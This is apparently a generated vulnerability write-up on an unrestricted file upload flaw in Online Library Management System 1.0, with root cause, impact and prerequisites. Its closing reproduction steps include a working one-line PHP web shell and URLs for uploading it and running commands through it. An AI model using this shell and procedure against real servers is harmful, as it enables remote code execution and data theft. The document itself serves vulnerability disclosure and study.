Based on the provided content, here's an analysis of the vulnerability:

**CVE ID:** The provided content does not explicitly mention CVE-2020-28130, it is marked as N/A on the exploit page. However, it describes an arbitrary file upload vulnerability in "Online Library Management System 1.0".

**Root Cause of Vulnerability:** The vulnerability stems from the lack of proper file type validation in the file upload functionality of the Online Library Management System. This allows an attacker to upload a malicious PHP script.

**Weaknesses/Vulnerabilities Present:**
*   **Unrestricted File Upload:** The system allows uploading files without properly checking their type, leading to the ability to upload arbitrary files, including PHP scripts.
*   **Lack of Input Validation:** There appears to be no input sanitization or validation to prevent malicious code from being uploaded.

**Impact of Exploitation:**
*   **Arbitrary Code Execution:** By uploading a PHP shell script, the attacker can execute arbitrary commands on the server. This can lead to complete compromise of the system, including data theft, modification, and server takeover.
*   **System Compromise:** The attacker gains full control of the web server.

**Attack Vectors:**
*   **Web Interface:** The vulnerability is exploited through the web interface by uploading a malicious file.
*   **Direct Access:** Once the file is uploaded, the attacker can access the file directly via a URL.

**Required Attacker Capabilities/Position:**
*   **Network Access:** The attacker needs network access to the vulnerable web application to interact with the upload functionality.
*   **Basic Web Knowledge:** The attacker needs to be able to fill out forms and navigate to specific URLs.
*   **Malicious Script Creation:** The attacker needs to create a basic PHP script with commands they want to execute.

**Detailed Steps to Reproduce (from Exploit DB):**

1.  Fill in the required details on the vulnerable page (`http://localhost/librarysystem/admin/borrower/index.php?view=add`).
2.  Create a PHP shell script with the following code:
    ```php
    <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
    ```
3.  Use the "Browse" functionality to select the PHP shell script file.
4.  Click "Save" to upload the file.
5.  Access the uploaded file via URL. For example `http://localhost/librarysystem/admin/borrower/photos/23102020080814backdoor.php?cmd=dir`.
6.  Add system commands after `cmd=` to execute them.
